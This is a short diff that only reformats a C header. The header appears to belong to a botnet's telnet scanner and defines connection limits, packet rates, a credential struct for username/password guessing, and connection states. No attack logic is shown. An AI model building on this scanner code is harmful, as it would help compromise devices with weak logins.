@@ -5,27 +5,30 @@
 #include "includes.h"
 
 #ifdef DEBUG
-#define SCANNER_MAX_CONNS   128
-#define SCANNER_RAW_PPS     160
+#define SCANNER_MAX_CONNS 128
+#define SCANNER_RAW_PPS 160
 #else
-#define SCANNER_MAX_CONNS   128
-#define SCANNER_RAW_PPS     160
+#define SCANNER_MAX_CONNS 128
+#define SCANNER_RAW_PPS 160
 #endif
 
-#define SCANNER_RDBUF_SIZE  256
-#define SCANNER_HACK_DRAIN  64
+#define SCANNER_RDBUF_SIZE 256
+#define SCANNER_HACK_DRAIN 64
 
-struct scanner_auth {
+struct scanner_auth
+{
     char *username;
     char *password;
     uint16_t weight_min, weight_max;
     uint8_t username_len, password_len;
 };
 
-struct scanner_connection {
+struct scanner_connection
+{
     struct scanner_auth *auth;
     int fd, last_recv;
-    enum {
+    enum
+    {
         SC_CLOSED,
         SC_CONNECTING,
         SC_HANDLE_IACS,
